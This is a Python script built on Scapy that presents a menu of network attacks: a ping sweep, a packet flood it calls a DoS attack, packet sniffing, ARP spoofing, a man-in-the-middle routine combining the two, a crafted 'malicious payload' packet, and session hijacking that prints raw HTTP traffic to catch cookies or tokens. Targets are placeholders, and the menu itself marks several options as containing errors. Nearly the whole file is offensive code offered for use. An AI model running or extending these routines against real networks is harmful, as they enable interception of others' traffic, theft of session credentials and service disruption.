from scapy.all import *

def network_scan():
    print("Scanning network...")
    # Scanning the network for active hosts using ICMP Echo Requests (Ping)
    ans, unans = sr(IP(dst="192.168.1.1/24") / ICMP(), timeout=2, verbose=0)
    ans.summary(lambda s_r: s_r[1].sprintf("%IP.src% is up"))


def dos_attack():
    print("Simulating DoS attack...")
    # Sending a large number of TCP packets to port 80 of the target host
    send(IP(dst="target_ip") / TCP(dport=80), count=1000, inter=0.1)

def packet_sniffing():
    print("Starting packet sniffing...")
    # Sniffing TCP packets on the network
    packets = sniff(filter="tcp", count=10)
    packets.summary()

def arp_spoofing():
    print("Starting ARP spoofing...")
    # Sending an ARP reply to trick the target into sending us the traffic
    send(ARP(op=2, pdst="target_ip", hwdst="target_mac", psrc="gateway_ip"), count=10)

def mitm_attack():
    print("Simulating Man-in-the-Middle attack...")
    # Combining ARP Spoofing and packet sniffing for MiTM
    # Note: Additional setup may be required for a full MiTM attack
    arp_spoofing()
    packet_sniffing()

def craft_malicious_packets():
    print("Crafting malicious packets...")
    # Sending a crafted packet with a potential malicious payload
    send(IP(dst="target_ip") / TCP() / Raw(load="malicious_payload"))

def session_hijacking():
    print("Attempting session hijacking...")
    # Sniffing packets to potentially capture session tokens or cookies
    packets = sniff(filter="tcp and port 80", count=10)
    for packet in packets:
        if packet.haslayer(Raw):
            print(packet[Raw].load)

def main():
    while True:
        print("(se) = shows errors(in code)")
        print("(ne) = no errors(in code)")
        print("\nChoose a test to perform:")
        print("1. Network Scanning(se)")
        print("2. DoS Attack(se)")
        print("3. Packet Sniffing(ne)")
        print("4. ARP Spoofing(se)")
        print("5. Man-in-the-Middle Attack(ne)")
        print("6. Craft Malicious Packets(se)")
        print("7. Session Hijacking(ne)")
        print("8. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            network_scan()
        elif choice == '2':
            dos_attack()
        elif choice == '3':
            packet_sniffing()
        elif choice == '4':
            arp_spoofing()
        elif choice == '5':
            mitm_attack()
        elif choice == '6':
            craft_malicious_packets()
        elif choice == '7':
            session_hijacking()
        elif choice == '8':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
